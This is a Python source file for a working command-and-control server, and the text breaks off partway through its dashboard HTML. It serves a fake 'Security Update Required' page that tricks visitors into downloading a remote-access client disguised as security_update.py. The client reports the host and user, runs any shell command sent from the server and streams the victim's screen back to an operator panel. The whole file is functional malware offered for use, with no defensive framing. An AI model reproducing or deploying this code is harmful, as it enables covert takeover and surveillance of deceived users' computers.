#!/usr/bin/env python3
"""
LIVE MOTION STREAM C2 SERVER
Real-time screen streaming with motion animation
"""

from flask import Flask, request, jsonify, send_file, Response
from flask_socketio import SocketIO, emit, join_room
from flask_cors import CORS
import os
import base64
import hashlib
import time
import secrets
import threading
import json
from collections import defaultdict
import io
from datetime import datetime

app = Flask(__name__)
CORS(app)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024

socketio = SocketIO(app, 
                   cors_allowed_origins="*",
                   async_mode='threading',
                   logger=False,
                   engineio_logger=False)

# Storage
for dir in ['uploads', 'downloads', 'screenshots', 'logs', 'stream_cache']:
    os.makedirs(dir, exist_ok=True)

# In-memory storage
clients = {}
client_sockets = {}
command_results = {}
pending_commands = defaultdict(list)
connected_controllers = set()
session_tokens = {}
streaming_clients = {}  # {client_id: {'active': True, 'interval': 0.5, 'last_frame': timestamp}}
client_frames = defaultdict(list)  # Store recent frames for each client
MAX_FRAMES_PER_CLIENT = 10  # Keep only last 10 frames

# Authentication
ADMIN_PASSWORD = "C2Master123"
SESSION_DURATION = 3600

print("""
╔══════════════════════════════════════════════════════╗
║       LIVE MOTION STREAM C2 SERVER v2.0             ║
║      Real-time Screen Animation                     ║
╚══════════════════════════════════════════════════════╝
""")

# ============= AUTHENTICATION =============

def check_auth():
    token = request.cookies.get('c2_token')
    if token and token in session_tokens:
        if session_tokens[token] > time.time():
            return True
        else:
            del session_tokens[token]
    return False

# ============= WEB ROUTES =============

@app.route('/')
def index():
    if check_auth():
        return dashboard_html()
    return login_html()

@app.route('/login', methods=['POST'])
def login():
    password = request.form.get('password', '')
    
    if password == ADMIN_PASSWORD:
        token = secrets.token_hex(32)
        session_tokens[token] = time.time() + SESSION_DURATION
        
        response = app.make_response(dashboard_html())
        response.set_cookie('c2_token', token, max_age=SESSION_DURATION, httponly=True)
        return response
    
    return '''
    <html>
    <head><title>Access Denied</title></head>
    <body style="background:#0a0a1a;display:flex;justify-content:center;align-items:center;height:100vh;">
        <div style="background:#1a1a3a;padding:40px;border-radius:10px;text-align:center;border:2px solid #ff3860;">
            <h1 style="color:#ff3860;">⚠️ ACCESS DENIED</h1>
            <p style="color:#8888ff;">Invalid password</p>
            <a href="/" style="display:inline-block;margin-top:20px;padding:10px 20px;background:#667eea;color:white;text-decoration:none;border-radius:5px;">Try Again</a>
        </div>
    </body>
    </html>
    '''

@app.route('/logout')
def logout():
    token = request.cookies.get('c2_token')
    if token in session_tokens:
        del session_tokens[token]
    
    response = app.make_response(login_html())
    response.set_cookie('c2_token', '', expires=0)
    return response

@app.route('/infect')
def infect_page():
    """Infection page that serves the client"""
    server_url = request.host_url.rstrip('/')
    
    # Get user agent for platform detection
    user_agent = request.headers.get('User-Agent', '').lower()
    
    infection_html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Security Update Required</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                color: #e0e0ff;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                overflow: hidden;
            }
            .container {
                background: rgba(0, 0, 0, 0.8);
                padding: 40px;
                border-radius: 15px;
                border: 2px solid #00aaff;
                box-shadow: 0 0 30px rgba(0, 170, 255, 0.5);
                text-align: center;
                max-width: 600px;
                backdrop-filter: blur(10px);
            }
            .logo {
                font-size: 60px;
                margin-bottom: 20px;
                color: #00aaff;
                text-shadow: 0 0 20px #00aaff;
            }
            h1 {
                color: #ffffff;
                margin-bottom: 10px;
                font-size: 28px;
            }
            .progress-container {
                background: rgba(255, 255, 255, 0.1);
                border-radius: 10px;
                height: 20px;
                margin: 30px 0;
                overflow: hidden;
            }
            .progress-bar {
                background: linear-gradient(90deg, #00aaff, #0088cc);
                height: 100%;
                width: 0%;
                border-radius: 10px;
                animation: progress 4s forwards;
            }
            @keyframes progress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            .status {
                margin: 20px 0;
                font-size: 16px;
                color: #88ddff;
            }
            .details {
                background: rgba(0, 50, 100, 0.3);
                padding: 15px;
                border-radius: 8px;
                margin-top: 20px;
                text-align: left;
                font-size: 14px;
                color: #aaccff;
            }
            .hidden {
                display: none;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">🔒</div>
            <h1>Security Update Required</h1>
            <p style="color:#88ddff;">Your system requires critical security patches</p>
            
            <div class="progress-container">
                <div class="progress-bar"></div>
            </div>
            
            <div class="status" id="status">Initializing security module...</div>
            
            <div class="details" id="details">
                <p>🔍 Scanning system configuration...</p>
                <p>📦 Downloading security patches...</p>
                <p>⚙️ Applying updates...</p>
                <p>✅ Verifying installation...</p>
            </div>
            
            <div id="success" class="hidden">
                <div style="color:#00ffaa;font-size:20px;margin:20px 0;">✓ Security update completed successfully!</div>
                <p style="color:#88ff88;">Your system is now protected.</p>
            </div>
        </div>
        
        <script>
            const serverUrl = "''' + server_url + '''";
            let step = 0;
            const statusMessages = [
                "Initializing security module...",
                "Scanning system for vulnerabilities...",
                "Downloading critical patches...",
                "Verifying digital signatures...",
                "Applying security updates...",
                "Optimizing system performance...",
                "Finalizing installation...",
                "Security update complete!"
            ];
            
            function updateStatus() {
                const statusEl = document.getElementById('status');
                if (step < statusMessages.length) {
                    statusEl.textContent = statusMessages[step];
                    step++;
                    setTimeout(updateStatus, 500);
                } else {
                    document.getElementById('details').classList.add('hidden');
                    document.getElementById('success').classList.remove('hidden');
                    startClient();
                }
            }
            
            function startClient() {
                // Create invisible iframe to load client
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = serverUrl + '/download_client';
                document.body.appendChild(iframe);
                
                // Also try to connect via WebSocket
                connectWebSocket();
                
                // Auto-download Python client
                setTimeout(() => {
                    downloadPythonClient();
                }, 1000);
            }
            
            function connectWebSocket() {
                try {
                    const ws = new WebSocket('ws://' + window.location.host + '/socket.io/?transport=websocket');
                    
                    ws.onopen = () => {
                        console.log('Connected to security server');
                        ws.send(JSON.stringify({
                            type: 'web_register',
                            data: {
                                userAgent: navigator.userAgent,
                                platform: navigator.platform,
                                hostname: window.location.hostname
                            }
                        }));
                    };
                } catch (e) {
                    console.log('WebSocket connection failed');
                }
            }
            
            function downloadPythonClient() {
                const link = document.createElement('a');
                link.href = serverUrl + '/download_client.py';
                link.download = 'security_update.py';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }
            
            // Start the process
            setTimeout(updateStatus, 1000);
        </script>
    </body>
    </html>
    '''
    
    return infection_html

@app.route('/download_client')
def download_client_page():
    """Download page for client"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download Security Update</title>
        <style>
            body { font-family: Arial; padding: 40px; text-align: center; }
            .download-box { 
                background: #f0f0f0; 
                padding: 30px; 
                border-radius: 10px; 
                display: inline-block;
                margin-top: 50px;
            }
            a {
                display: inline-block;
                padding: 15px 30px;
                background: #4CAF50;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                font-size: 18px;
                margin: 10px;
            }
        </style>
    </head>
    <body>
        <h1>Security Update Download</h1>
        <p>Click below to download the security update:</p>
        <div class="download-box">
            <a href="/download_client.py">Download Python Client</a>
            <br><br>
            <small>Run the downloaded file to complete installation</small>
        </div>
    </body>
    </html>
    '''

@app.route('/download_client.py')
def download_client_py():
    """Serve the Python client file"""
    server_url = request.host_url.rstrip('/')
    
    client_code = f'''#!/usr/bin/env python3
"""
SECURITY UPDATE CLIENT
Automated Security Patches
"""

import socketio
import platform
import getpass
import subprocess
import threading
import time
import sys
import os
import base64
import mss
import tempfile
from datetime import datetime

class SecurityClient:
    def __init__(self, server_url):
        self.server_url = server_url
        self.sio = socketio.Client()
        self.client_id = None
        self.streaming = False
        self.stream_interval = 0.5  # 2 FPS by default
        
        # System info
        self.hostname = platform.node()
        self.username = getpass.getuser()
        self.os = platform.system() + " " + platform.release()
        self.platform = platform.platform()
        
        self.setup_handlers()
    
    def setup_handlers(self):
        @self.sio.on('connect')
        def on_connect():
            print("[SECURITY] Connected to update server")
            self.register()
        
        @self.sio.on('disconnect')
        def on_disconnect():
            print("[SECURITY] Disconnected from server")
            self.streaming = False
        
        @self.sio.on('welcome')
        def on_welcome(data):
            self.client_id = data['client_id']
            print(f"[SECURITY] Registered: {{self.client_id}}")
        
        @self.sio.on('command')
        def on_command(data):
            self.execute_command(data)
        
        @self.sio.on('start_stream')
        def on_start_stream(data):
            self.streaming = True
            self.stream_interval = data.get('interval', 0.5)
            print(f"[STREAM] Starting screen stream ({{1/self.stream_interval}} FPS)")
            threading.Thread(target=self.stream_screen, daemon=True).start()
        
        @self.sio.on('stop_stream')
        def on_stop_stream(data):
            self.streaming = False
            print("[STREAM] Stopping screen stream")
    
    def register(self):
        """Register with server"""
        self.sio.emit('register', {{
            'hostname': self.hostname,
            'username': self.username,
            'os': self.os,
            'platform': self.platform,
            'capabilities': ['screen_stream', 'commands']
        }})
    
    def execute_command(self, data):
        """Execute command from server"""
        cmd_id = data['id']
        command = data.get('command', '')
        
        try:
            if platform.system() == "Windows":
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            
            output = result.stdout
            if result.stderr:
                output += "\\nERROR:\\n" + result.stderr
            
            self.sio.emit('result', {{
                'command_id': cmd_id,
                'client_id': self.client_id,
                'command': command,
                'output': output,
                'success': result.returncode == 0
            }})
            
        except Exception as e:
            self.sio.emit('result', {{
                'command_id': cmd_id,
                'client_id': self.client_id,
                'command': command,
                'output': f"Error: {{str(e)}}",
                'success': False
            }})
    
    def stream_screen(self):
        """Stream screen captures"""
        try:
            import mss
            import mss.tools
            
            with mss.mss() as sct:
                monitor = sct.monitors[1]  # Primary monitor
                
                while self.streaming:
                    try:
                        # Capture screen
                        screenshot = sct.grab(monitor)
                        
                        # Convert to PNG bytes
                        png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                        
                        # Convert to base64
                        img_base64 = base64.b64encode(png_bytes).decode('utf-8')
                        
                        # Send to server
                        self.sio.emit('screen_frame', {{
                            'client_id': self.client_id,
                            'frame': img_base64,
                            'timestamp': time.time(),
                            'size': len(png_bytes)
                        }})
                        
                        # Wait for next frame
                        time.sleep(self.stream_interval)
                        
                    except Exception as e:
                        print(f"[STREAM ERROR] {{e}}")
                        time.sleep(1)
                        
        except ImportError:
            print("[STREAM] MSS not installed, screen streaming disabled")
            self.sio.emit('result', {{
                'client_id': self.client_id,
                'command': 'screen_stream',
                'output': 'MSS library not installed. Install with: pip install mss pillow',
                'success': False
            }})
        except Exception as e:
            print(f"[STREAM ERROR] {{e}}")
    
    def heartbeat(self):
        """Send periodic heartbeat"""
        while True:
            if self.client_id:
                self.sio.emit('heartbeat', {{
                    'client_id': self.client_id,
                    'timestamp': time.time()
                }})
            time.sleep(30)
    
    def start(self):
        """Start the client"""
        try:
            self.sio.connect(self.server_url)
            
            # Start heartbeat thread
            threading.Thread(target=self.heartbeat, daemon=True).start()
            
            # Keep running
            self.sio.wait()
            
        except Exception as e:
            print(f"[ERROR] Connection failed: {{e}}")
            print("[RECONNECT] Retrying in 10 seconds...")
            time.sleep(10)
            self.start()

if __name__ == '__main__':
    # Get server URL from command line or use current host
    if len(sys.argv) > 1:
        server_url = sys.argv[1]
    else:
        # Try to get from environment or use default
        server_url = "{server_url}"
    
    print(f"[SECURITY] Starting security client")
    print(f"[SECURITY] Server: {{server_url}}")
    
    client = SecurityClient(server_url)
    client.start()
'''

    response = Response(client_code, mimetype='text/plain')
    response.headers['Content-Disposition'] = 'attachment; filename=security_update.py'
    return response

# ============= API ROUTES =============

@app.route('/api/clients')
def api_clients():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    client_list = []
    for client_id, client in clients.items():
        client_list.append({
            'client_id': client_id,
            'hostname': client.get('hostname', 'Unknown'),
            'username': client.get('username', 'Unknown'),
            'os': client.get('os', 'Unknown'),
            'online': client.get('online', False),
            'last_seen': client.get('last_seen', 0),
            'streaming': client_id in streaming_clients
        })
    return jsonify(client_list)

@app.route('/api/execute', methods=['POST'])
def api_execute():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    
    if not client_id or not command:
        return jsonify({'error': 'Missing client_id or command'}), 400
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
    cmd_obj = {
        'id': cmd_id,
        'command': command,
        'timestamp': time.time(),
        'status': 'pending'
    }
    
    if client_id in client_sockets:
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        return jsonify({'status': 'sent', 'command_id': cmd_id})
    else:
        pending_commands[client_id].append(cmd_obj)
        return jsonify({'status': 'queued', 'command_id': cmd_id})

@app.route('/api/stream/start', methods=['POST'])
def api_start_stream():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.get_json()
    client_id = data.get('client_id')
    interval = data.get('interval', 0.5)  # Default 2 FPS
    
    if client_id not in clients:
        return jsonify({'error': 'Client not found'}), 404
    
    streaming_clients[client_id] = {
        'active': True,
        'interval': interval,
        'last_frame': time.time(),
        'frame_count': 0
    }
    
    if client_id in client_sockets:
        socketio.emit('start_stream', {
            'interval': interval
        }, room=client_sockets[client_id])
    
    return jsonify({'status': 'started', 'interval': interval})

@app.route('/api/stream/stop', methods=['POST'])
def api_stop_stream():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.get_json()
    client_id = data.get('client_id')
    
    if client_id in streaming_clients:
        streaming_clients[client_id]['active'] = False
        
        if client_id in client_sockets:
            socketio.emit('stop_stream', {}, room=client_sockets[client_id])
        
        # Clear old frames
        if client_id in client_frames:
            client_frames[client_id].clear()
    
    return jsonify({'status': 'stopped'})

@app.route('/api/stream/frames/<client_id>')
def api_get_frames(client_id):
    """Get recent frames for a client"""
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    frames = client_frames.get(client_id, [])
    return jsonify({
        'frames': frames[-10:],  # Last 10 frames
        'total_frames': len(frames),
        'streaming': client_id in streaming_clients and streaming_clients[client_id]['active']
    })

@app.route('/api/stats')
def api_stats():
    if not check_auth():
        return jsonify({'error': 'Unauthorized'}), 401
    
    online = sum(1 for c in clients.values() if c.get('online', False))
    streaming = sum(1 for s in streaming_clients.values() if s.get('active', False))
    
    return jsonify({
        'total_clients': len(clients),
        'online_clients': online,
        'streaming_clients': streaming,
        'total_commands': len(command_results),
        'total_frames': sum(len(frames) for frames in client_frames.values()),
        'server_uptime': time.time() - app_start_time
    })

# ============= SOCKET.IO EVENTS =============

app_start_time = time.time()

@socketio.on('connect')
def handle_connect():
    print(f"[+] New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    if request.sid in connected_controllers:
        connected_controllers.remove(request.sid)
        print(f"[-] Controller disconnected: {request.sid}")
        return
    
    for client_id, socket_id in list(client_sockets.items()):
        if socket_id == request.sid:
            if client_id in clients:
                clients[client_id]['online'] = False
                clients[client_id]['last_seen'] = time.time()
            
            if client_id in streaming_clients:
                streaming_clients[client_id]['active'] = False
            
            del client_sockets[client_id]
            print(f"[-] Client disconnected: {client_id}")
            socketio.emit('client_offline', {'client_id': client_id})
            break

@socketio.on('controller_connect')
def handle_controller_connect():
    token = request.args.get('token')
    if not token or token not in session_tokens or session_tokens[token] < time.time():
        emit('auth_error', {'error': 'Invalid or expired token'})
        return
    
    connected_controllers.add(request.sid)
    print(f"[+] Web controller connected: {request.sid}")
    
    for client_id, client in clients.items():
        if client.get('online', False):
            socketio.emit('client_online', {
                'client_id': client_id,
                'hostname': client.get('hostname', 'Unknown'),
                'username': client.get('username', 'Unknown'),
                'os': client.get('os', 'Unknown'),
                'online': True,
                'streaming': client_id in streaming_clients and streaming_clients[client_id]['active']
            }, room=request.sid)
    
    emit('controller_ready', {'message': 'Connected to C2 server'})

@socketio.on('execute_command')
def handle_execute_command(data):
    client_id = data.get('client_id')
    command = data.get('command')
    
    if client_id in client_sockets:
        cmd_id = f"cmd_{int(time.time())}_{secrets.token_hex(4)}"
        cmd_obj = {
            'id': cmd_id,
            'command': command,
            'timestamp': time.time(),
            'status': 'pending'
        }
        socketio.emit('command', cmd_obj, room=client_sockets[client_id])
        emit('command_sent', {'command_id': cmd_id, 'client_id': client_id})
    else:
        emit('command_error', {'error': 'Client offline', 'client_id': client_id})

@socketio.on('start_stream_command')
def handle_start_stream_command(data):
    client_id = data.get('client_id')
    interval = data.get('interval', 0.5)
    
    if client_id in client_sockets:
        streaming_clients[client_id] = {
            'active': True,
            'interval': interval,
            'last_frame': time.time(),
            'frame_count': 0
        }
        
        socketio.emit('start_stream', {
            'interval': interval
        }, room=client_sockets[client_id])
        
        emit('stream_started', {
            'client_id': client_id,
            'interval': interval
        })

@socketio.on('stop_stream_command')
def handle_stop_stream_command(data):
    client_id = data.get('client_id')
    
    if client_id in streaming_clients:
        streaming_clients[client_id]['active'] = False
        
        if client_id in client_sockets:
            socketio.emit('stop_stream', {}, room=client_sockets[client_id])
        
        # Clear frames
        if client_id in client_frames:
            client_frames[client_id].clear()
        
        emit('stream_stopped', {'client_id': client_id})

@socketio.on('register')
def handle_register(data):
    client_id = data.get('id')
    
    if not client_id:
        unique = f"{data.get('hostname', '')}{data.get('username', '')}{data.get('os', '')}{time.time()}"
        client_id = hashlib.sha256(unique.encode()).hexdigest()[:16]
    
    clients[client_id] = {
        'id': client_id,
        'hostname': data.get('hostname', 'Unknown'),
        'username': data.get('username', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'ip': request.remote_addr,
        'online': True,
        'first_seen': time.time(),
        'last_seen': time.time(),
        'capabilities': data.get('capabilities', [])
    }
    
    client_sockets[client_id] = request.sid
    join_room(client_id)
    
    print(f"[+] Client registered: {client_id} - {data.get('hostname')}")
    
    emit('welcome', {
        'client_id': client_id,
        'message': 'Connected to Security Server',
        'timestamp': time.time()
    })
    
    socketio.emit('client_online', {
        'client_id': client_id,
        'hostname': data.get('hostname'),
        'username': data.get('username'),
        'os': data.get('os'),
        'platform': data.get('platform'),
        'ip': request.remote_addr,
        'online': True,
        'streaming': False
    })
    
    if client_id in pending_commands and pending_commands[client_id]:
        for cmd in pending_commands[client_id]:
            emit('command', cmd)
        pending_commands[client_id].clear()

@socketio.on('heartbeat')
def handle_heartbeat(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['online'] = True
        emit('heartbeat_ack', {'timestamp': time.time()})

@socketio.on('result')
def handle_result(data):
    cmd_id = data.get('command_id')
    client_id = data.get('client_id')
    
    print(f"[*] Result from {client_id}")
    
    result_data = {
        'command_id': cmd_id,
        'client_id': client_id,
        'command': data.get('command', ''),
        'output': data.get('output', ''),
        'success': data.get('success', True),
        'timestamp': time.time()
    }
    
    command_results[cmd_id] = result_data
    socketio.emit('command_result', result_data)

@socketio.on('screen_frame')
def handle_screen_frame(data):
    """Handle incoming screen frames from client"""
    client_id = data.get('client_id')
    frame_data = data.get('frame')
    timestamp = data.get('timestamp', time.time())
    
    if client_id not in streaming_clients or not streaming_clients[client_id]['active']:
        return
    
    # Update streaming stats
    streaming_clients[client_id]['last_frame'] = timestamp
    streaming_clients[client_id]['frame_count'] += 1
    
    # Store frame (limit to MAX_FRAMES_PER_CLIENT)
    if client_id not in client_frames:
        client_frames[client_id] = []
    
    frame_obj = {
        'data': frame_data,
        'timestamp': timestamp,
        'size': data.get('size', 0),
        'index': streaming_clients[client_id]['frame_count']
    }
    
    client_frames[client_id].append(frame_obj)
    
    # Keep only recent frames
    if len(client_frames[client_id]) > MAX_FRAMES_PER_CLIENT:
        # Remove oldest frame
        client_frames[client_id].pop(0)
    
    # Broadcast to controllers watching this client
    socketio.emit('new_frame', {
        'client_id': client_id,
        'frame': frame_data,
        'timestamp': timestamp,
        'frame_index': streaming_clients[client_id]['frame_count'],
        'total_frames': len(client_frames[client_id])
    })

# ============= HTML DASHBOARD =============

def login_html():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Control - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3a 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .login-box {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                padding: 50px;
                border-radius: 15px;
                border: 2px solid #00aaff;
                box-shadow: 0 0 50px rgba(0, 170, 255, 0.3);
                width: 90%;
                max-width: 450px;
                text-align: center;
            }
            .logo {
                color: #00aaff;
                font-size: 48px;
                margin-bottom: 20px;
                text-shadow: 0 0 20px rgba(0, 170, 255, 0.5);
            }
            h1 {
                color: white;
                margin-bottom: 10px;
                font-size: 28px;
            }
            .subtitle {
                color: #88ddff;
                margin-bottom: 30px;
            }
            input[type="password"] {
                width: 100%;
                padding: 15px;
                margin-bottom: 20px;
                background: rgba(0, 0, 0, 0.5);
                border: 2px solid #445588;
                border-radius: 8px;
                color: white;
                font-size: 16px;
                transition: all 0.3s;
            }
            input[type="password"]:focus {
                outline: none;
                border-color: #00aaff;
                box-shadow: 0 0 15px rgba(0, 170, 255, 0.5);
            }
            button {
                width: 100%;
                padding: 15px;
                background: linear-gradient(135deg, #00aaff 0%, #0088cc 100%);
                color: white;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                transition: transform 0.3s;
            }
            button:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 20px rgba(0, 170, 255, 0.4);
            }
            .warning {
                margin-top: 20px;
                color: #ff5555;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <div class="logo">🔐</div>
            <h1>C2 Control Panel</h1>
            <p class="subtitle">Enter password to continue</p>
            <form method="POST" action="/login">
                <input type="password" name="password" placeholder="Enter password" required autofocus>
                <button type="submit">Access Control Panel</button>
            </form>
            <p class="warning">⚠️ Authorized personnel only</p>
        </div>
    </body>
    </html>
    '''

def dashboard_html():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>C2 Live Stream Control</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0a0a1a 0%, #1a1a3a 100%);
                color: #e0e0ff;
                min-height: 100vh;
            }
            .header {
                background: rgba(0, 0, 0, 0.8);
                backdrop-filter: blur(10px);
                padding: 20px;
                border-bottom: 2px solid #00aaff;
                display: flex;
                justify-content: space-between;
                align-items: center;
                position: sticky;
                top: 0;
                z-index: 1000;
            }
            .logo {
                display: flex;
                align-items: center;
                gap: 10px;
                font-size: 24px;
                font-weight: bold;
                color: #00aaff;
                text-shadow: 0 0 10px rgba(0, 170, 255, 0.5);
            }
            .container {
                padding: 20px;
                max-width: 1400px;
                margin: 0 auto;
            }
            .dashboard-grid {
                display: grid;
                grid-template-columns: 300px 1fr;
                gap: 20px;
                margin-bottom: 30px;
            }
            @media (max-width: 1024px) {
                .dashboard-grid { grid-template-columns: 1fr; }
            }
            .panel {
                background: rgba(0, 0, 0, 0.7);
                border-radius: 10px;
                padding: 20px;
                border: 1px solid #334477;
                backdrop-filter: blur(10px);
            }
            .panel-title {
                color: #00aaff;
                font-size: 1.2em;
                margin-bottom: 15px;
                padding-bottom: 10px;
                border-bottom: 2px solid #00aaff;
            }
            .client-list {
                max-height: 400px;
                overflow-y: auto;
            }
            .client-item {
                background: rgba(20, 30, 60, 0.7);
                border-radius: 8px;
                padding: 15px;
                margin-bottom: 10px;
                border: 1px solid #445588;
                transition: all 0.3s;
                cursor: pointer;
            }
            .client-item:hover {
                border-color: #00aaff;
                background: rgba(30, 40, 80, 0.8);
                transform: translateX(5px);
            }
            .client-item.selected {
                border-color: #00ffaa;
                background: rgba(20, 60, 40, 0.8);
            }
            .client-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 10px;
            }
            .client-name {
                font-weight: bold;
                color: #88ddff;
                font-size: 1.1em;
            }
            .client-status {
                padding: 3px 10px;
                border-radius: 15px;
                font-size: 0.8em;
                font-weight: bold;
            }
            .online { background: rgba(0, 255, 0, 0.2); color: #00ff00; border: 1px solid #00ff00; }
            .offline { background: rgba(255, 0, 0, 0.2); color: #ff5555; border: 1px solid #ff5555; }
            .streaming { background: rgba(0, 170, 255, 0.2); color: #00aaff; border: 1px solid #00aaff; }
            
            .live-stream-container {
                background: rgba(0, 0, 0, 0.9);
                border-radius: 10px;
                padding: 20px;
                border: 2px solid #00aaff;
                box-shadow: 0 0 30px rgba(0, 170, 255, 0.3);
            }
            .stream-display {
                background: #000;
                border-radius: 8px;
                overflow: hidden;
                position: relative;
                min-height: 400px;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            #live-frame {
                max-width: 100%;
                max-height: 70vh;
                object-fit: contain;
                display: none;
            }
            .no-stream {
                color: #8888ff;
                font-size: 1.2em;
                text-align: center;
                padding: 40px;
            }
            .stream-controls {
                display: flex;
                gap: 10px;
                margin-top: 15px;
                justify-content: center;
            }
            .btn {
                padding: 10px 20px;
                border: none;
                border-radius: 6px;
                cursor: pointer;
                font-weight: bold;
                transition: all 0.3s;
            }
            .btn-primary {
                background: linear-gradient(135deg, #00aaff, #0088cc);
                color: white;
            }
            .btn-primary:hover {
                background: linear-gradient(135deg, #00bbff, #0099dd);
                box-shadow: 0 0 15px rgba(0, 170, 255, 0.5);
            }
            .btn-success {
                background: linear-gradient(135deg, #00aa55, #008844);
                color: white;
            }
            .btn-success:hover {
                background: linear-gradient(135deg, #00bb66, #009955);
                box-shadow: 0 0 15px rgba(0, 170, 85, 0.5);
            }
            .btn-danger {
                background: linear-gradient(135deg, #ff5555, #cc0000);
                color: white;
            }
            .btn-danger:hover {
                background: linear-gradient(135deg, #ff6666, #dd0000);
                box-shadow: 0 0 15px rgba(255, 85, 85, 0.5);
            }
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 15px;
                margin-top: 20px;
            }
            .stat-box {
                background: rgba(0, 0, 0, 0.6);
                border-radius: 8px;
                padding: 15px;
                text-align: center;
                border: 1px solid #334477;
            }
            .stat-value {
                font-size: 2em;
                font-weight: bold;
                color: #00ffaa;
                text-shadow: 0 0 10px rgba(0, 255, 170, 0.5);
            }
            .stat-label {
                color: #aaddff;
                font-size: 0.9em;
                margin-top: 5px;
            }
            .command-section {
                display: grid;
                grid-template-columns: 1fr auto;
                gap: 10px;
                margin-top: 20px;
            }
            .command-input {
                padding: 12px;
                background: rgba(0, 0, 0, 0.8);
                border: 1px solid #445588;
                border-radius: 8px;
                color: white;
                font-family: monospace;
            }
            .quick-commands {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
                gap: 10px;
                margin-top: 15px;
            }
            .output-panel {
                background: rgba(0, 0, 0, 0.8);
                border-radius: 8px;
                padding: 15px;
                margin-top: 20px;
                max-height: 300px;
                overflow-y: auto;
                border: 1px solid #334477;
            }
            .output-content {
                font-family: 'Courier New', monospace;
                font-size: 0.9em;
                color: #88ff88;
                white-space: pre-wrap;
            }
            .stream-info {
                position: absolute;
                top: 10px;
                left: 10px;
                background: rgba(0, 0, 0, 0.7);
                padding: 8px 15px;
                border-radius: 6px;
                font-size: 0.9em;
                color: #88ff88;
                display: none;
            }
            .frame-counter {
                position: absolute;
                bottom: 10px;
                right: 10px;
                background: rgba(0, 0, 0, 0.7);
                padding: 8px 15px;
                border-radius: 6px;
                font-size: 0.9em;
                color: #00aaff;
                display: none;
            }
            .tab-container {
                margin-top: 20px;
            }
            .tabs {
                display: flex;
                background: rgba(0, 0, 0, 0.8);
                border-radius: 8px 8px 0 0;
                overflow: hidden;
            }
            .tab {
                padding: 15px 30px;
                cursor: pointer;
                background: rgba(0, 100, 200, 0.3);
                border-right: 1px solid #334477;
            }
            .tab.active {
                background: linear-gradient(135deg, #00aaff, #0088cc);
                font-weight: bold;
            }
            .tab-content {
                background: rgba(0, 0, 0, 0.7);
                padding: 20px;
                border-radius: 0 0 8px 8px;
            }
            .tab-pane {
                display: none;
            }
            .tab-pane.active {
                display: block;
            }
            .fps-controls {
                display: flex;
                gap: 10px;
                align-items: center;
                margin-top: 10px;
            }
            .fps-btn {
                padding: 5px 15px;
                border-radius: 4px;
                background: rgba(0, 100, 200, 0.3);
                border: 1px solid #3366aa;
                color: #88ccff;
                cursor: pointer;
            }
            .fps-btn.active {
                background: linear-gradient(135deg, #00aaff, #0088cc);
                color: white;
            }
            .infection-link {
                background: rgba(0, 50, 100, 0.3);
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
                border: 1px solid #3366aa;
            }
            .infection-link input {
                width: 100%;
                padding: 10px;
                background: rgba(0, 0, 0, 0.5);
                border: 1px solid #445588;
                border-radius: 5px;
                color: white;
                margin: 10px 0;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <div class="logo">
                <span>🎬</span>
                <span>C2 Live Stream Control</span>
            </div>
            <div>
                <a href="/logout" style="color:white;text-decoration:none;padding:10px 20px;background:rgba(255,85,85,0.3);border-radius:5px;">Logout</a>
            </div>
        </div>
        
